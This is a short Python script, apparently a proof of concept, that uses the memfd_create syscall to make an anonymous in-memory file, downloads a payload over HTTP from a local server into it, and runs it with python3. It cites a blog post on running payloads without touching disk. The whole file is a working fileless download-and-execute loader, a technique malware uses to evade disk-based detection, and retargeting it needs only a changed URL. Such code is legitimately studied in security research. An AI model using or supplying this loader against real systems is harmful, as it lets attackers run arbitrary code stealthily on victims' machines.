#! /usr/bin/python3

import ctypes
import ctypes.util
import os
import requests
import time
import subprocess

libc = ctypes.cdll.LoadLibrary(ctypes.util.find_library('c'))
memfd = libc.syscall(319,b'aqeeb', 1)
assert memfd >= 0
pid = os.getpid()
print("Process PID", pid)
print(memfd)
#time.sleep(30)

with open("/proc/{}/fd/{}".format(pid, memfd), mode='wb') as f1:
    f1.write(requests.get('http://127.0.0.1:8000/payload.py').content)

#os.execv('/proc/{}/fd/{}'.format(pid, memfd), [" "])
#subprocess.Popen(['/proc/{}/fd/{}'.format(pid, memfd)])

print("Executing payload...")
os.system('python3 /proc/{}/fd/{}'.format(pid, memfd))

# Reference: http://0x90909090.blogspot.com/2019/02/executing-payload-without-touching.html
